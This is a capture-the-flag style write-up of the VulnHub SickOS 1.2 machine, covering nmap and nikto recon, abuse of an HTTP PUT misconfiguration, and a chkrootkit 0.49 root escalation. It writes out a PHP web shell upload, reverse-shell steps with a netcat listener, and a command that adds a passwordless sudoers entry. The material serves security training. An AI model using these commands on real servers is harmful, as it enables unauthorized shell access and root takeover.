---
layout: default
---

# VulnHub - SickOS 1.2 writeup 

![Header image](/assets/images/vh_sickos/sickos_header.png)

[Room or VulnHub image link](https://www.vulnhub.com/entry/sickos-12,144/)

:sick: :computer:

## Introduction 

> "This is second in following series from SickOs and is independent of the prior releases, scope of challenge is to gain highest privileges on the system."

> "...the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assessment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually."

As stated above this machine will involve a bit of manual enumeration and testing to get the initial shell and then to gain root. Sometimes exploits can be really simple and obscure as this machine demonstrates.

## Initial recon

### Nmap scan

Starting with a fast (-T4) aggressive profile (-A) TCP SYN scan of all ports (-p-) and output it to all formats for later analysis if need be.

TCP Scan
```
sudo nmap 192.168.56.106 -T4 -A -p- -oA tcp_all_agg
```

We can also conduct a quick UDP version scan of just the top 1000 ports.

UDP Scan
```
sudo nmap 192.168.56.106 -sUV -vv -oA udp_top_1000
```

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Tue Aug  4 08:14:17 2020 as: nmap -T4 -A -p- -oA tcp_all_agg 192.168.56.106
Nmap scan report for 192.168.56.106
Host is up (0.00074s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:28:88:EE (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Uptime guess: 0.077 days (since Tue Aug  4 06:24:52 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 192.168.56.106

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug  4 08:15:57 2020 -- 1 IP address (1 host up) scanned in 101.16 seconds
```

Only two ports 80 (lighttpd) and 22 (OpenSSH) are open.

#### UDP Scan Results

```
# Nmap 7.80 scan initiated Mon Aug  3 15:01:34 2020 as: nmap -sUV -vv -oA udp_top_1000 192.168.56.106
Nmap scan report for 192.168.56.106
Host is up, received arp-response (0.00033s latency).
All 1000 scanned ports on 192.168.56.106 are open|filtered because of 1000 no-responses
MAC Address: 08:00:27:28:88:EE (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  3 16:24:56 2020 -- 1 IP address (1 host up) scanned in 5002.08 seconds
```

No open UDP ports detected.

## Enumeration

Lets start our enumeration of port 80 that is running the web server **lighttpd version 1.4.28**.

Checking exploit-db.com for exploits and vulnerabilities for lighttpd did reveals a few hits but none that match the current version 1.4.28.

The default web page greats us with a picture of young Keanu Reeves with a virus meme. Checking the the pages source code we do see a comment indicating there is nothing here.

![SickOS Web Server](/assets/images/vh_sickos/vh_sickos_web_1.jpg)

You can download the image and run it against strings, binwalk, exiftool, steghide to see if there is any stenographic data hidden in it but there is indeed nothing to be found.

We can enumerate the web server further with a nikto and gobuster directory scan to see if we can find anything.

```
nkito -h http://192.168.56.106/ | tee nikto_results.txt
```

The nikto scan does not reveal much besides the fact that the server is running PHP 5.3.10 on Ubuntu.

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.106
+ Target Hostname:    192.168.56.106
+ Target Port:        80
+ Start Time:         2020-08-03 15:10:19 (GMT-4)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.28
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.21
+ 26545 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2020-08-03 15:12:23 (GMT-4) (124 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Doing a gobuster scan reveals that its has a **/test** directory that is empty.
```
sudo gobuster -u http://192.168.56.104/ -dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10 -o gobuster_small_scan.txt
```

![SickOS Test directory](/assets/images/vh_sickos/vh_sickos_web_2.jpg)


### HTTP Web Server Methods

Well what now? There is nothing much to go off from here.

This is were the keep it simple trick might help. Lets check what HTTP Methods this server supports?

**Note** - Nikto normally conducts a HTTP Options check via its **httpoptions** plugin to see what methods/options the server supports but in this case it does not seem to work!
```
nikto -list-plugins
...
Plugin: httpoptions
 HTTP Options - Performs a variety of checks against the HTTP options returned from the server.
 Written by Sullo, Copyright (C) 2008 Chris Sullo
```

According to [this Security StackExchange](https://security.stackexchange.com/questions/70561/how-to-identify-the-http-methods-supported-by-a-web-server) post we need to test each method manually to confirm what the server supports. However instead of doing that there is another easier way using a curl command!

```
curl -v -X OPTIONS http://192.168.56.106/test
```

![HTTP Allowed Methods](/assets/images/vh_sickos/vh_sickos_http_methods_1.jpg)

As we can see that the server allows the following HTTP Methods some of which we can use to our advantage such as the PUT command that will allow us to upload files to the server.
> Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK

Nmap also has a script to check the supported HTTP methods of the server.

```
nmap --script http-methods --script-args http-methods.url-path='/test' 192.168.56.106 -p 80
```

![Nmap HTTP Method script](/assets/images/vh_sickos/vh_sickos_http_methods_2.jpg)

### Uploading via PUT Method

There are a few different ways we can utilize the PUT method allowed on the web server to upload files to the target system.

We can use curl to upload a PHP reverse shell to the /test directory on the web server. We utilized the shell found on Kali in **/usr/share/webshells/php/php-reverse-shell.php** and adjust the IP and port variables within it.

```
curl --upload-file php-reverse-shell.php -v --url http://192.168.56.106/test/shell.php -0 --http1.0
```

The shell can also be downloaded from here: [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

![Uploading via PUT](/assets/images/vh_sickos/vh_sickos_put_upload.jpg)

We can also get a very simple PHP command execution on the server using this curl command to write to a cmd.php file.
```
curl -X PUT -d '<?php system($_GET["cmd"]);' http://192.168.56.106/test/cmd.php
```

Execute code on the server by specifying the cmd parameter for this new cmd.php script.
```
curl "http://192.168.56.106/test/cmd.php?cmd=ls%20-lah"
```

**Note** - Nmap also has a [http-put.nse](https://nmap.org/nsedoc/scripts/http-put.html) script that allows you to easily upload files to a specified system.
> " Uploads a local file to a remote web server using the HTTP PUT method. You must specify the filename and URL path with NSE arguments."

Example usage:
```
nmap -p 80 <ip> --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
```

Once you uploaded the PHP reverse shell open up a listener on your attacking system.
```
sudo nc -nvlp 443
```

Then navigate to the location of the shell on the web server to execute the PHP shell.
```
http://192.168.56.106/test/shell.php
```

## Privilege Escalation

The first shell we get on the target system is as the **www-data** user, so we will need to find a way to escalate our privileges to root. There are 2 potential ways to achieve this on this machine as stated below. One seems to be the intended way and the other is a measure of last resort.

Let quickly enumerate the target system for privilege escalation vectors using [Linpeas script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS). Upload it to the target system using the curl put command below and then change the permissions to be able to execute it.

```
curl --upload-file linpeas.sh -v --url http://192.168.56.106/test/linpeas.sh -0 --http1.0

# Once on the target system
chmod +x linpeas.sh

# Execute all its tests and then output to a results file
./linpeas.sh -a | tee linpeas_results.txt
```

Linpeas will reveal the Linux Kernel version is a 99% chance of a privilege escalation vector. We will however not try this as Kernel exploits should be your last resort as it can harm/crash the system and even make it unusable if done incorrectly.

![Linpeas Scan](/assets/images/vh_sickos/vh_sickos_linpeas_1.jpg)


If you however wish to peruse this vector to escalate your privileges to root this exploit should work as it matches the Kernel version and Linux Distribution. Download the Kernel exploit from the link below and then compile it and execute for root.

[Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)

If you inspect the Linpeas results you will see that this system is executing [chkrootkit](https://en.wikipedia.org/wiki/Chkrootkit) in its cronjobs.

![Linpeas Cronjobs results](/assets/images/vh_sickos/vh_sickos_linpeas_2.jpg)

Checking exploit-db.com for exploits for **chkrootkit** reveals the following exploit for version 0.49.

[Chkrootkit 0.49 - Local Privilege Escalation ](https://www.exploit-db.com/exploits/33899)

We can check the current version on the target system with one of the following commands.
```
chkrootkit -V

or

dpkg -l | grep chkrootkit
```

![chkrootkit version](/assets/images/vh_sickos/vh_sickos_chkrootkit_version.jpg)

It appears like we have the vulnerable version. Time to exploit it but how? If you read the exploit it states the following.

> Steps to reproduce:
> Put an executable file named 'update' with non-root owner in /tmp (not mounted noexec, obviously)
> Run chkrootkit (as uid 0)

So we need to create a file named **update** and place it in the **/tmp** directory and have it run as root, the cronjob runs chkrootkit as root so this last requirement is taken care of automatically.

There are a few ways we can escalate our privileges using this **update** file. The easiest way would be to add the current **www-data** user to the sudoers file and give the account permissions to execute sudo with no password required. The command below will do this for us.

```bash 
echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

**Note** - I had to **chmod +x update** the file to make it work.

Once you have execute the above commands, wait a minute for the cronjob to execute and then **sudo su** to gain a root shell if everything work accordingly.

![chkrootkit privilege escalation](/assets/images/vh_sickos/vh_sickos_privesc.jpg)

This link explains a few more ways to exploit chkrootkit version 0.49

[Local root exploit in Chkrootkit](https://lepetithacker.wordpress.com/2017/04/30/local-root-exploit-in-chkrootkit/)

Metasploit Framework also has a exploit module that can also escalate our privileges if you wish to use Metasploit. You will be required to however generate and Metasploitable shell and upload and execute it on the target system.
```
use exploit/unix/local/chkrootkit
```

## Summary

This box was slightly tricky as it involved an obscure simple HTTP PUT method misconfiguration to get an initial shell on the system. The privilege escalation vector is also unique and takes advantage of an outdate chkrootkit binary.

## References
- https://en.wikipedia.org/wiki/Chkrootkit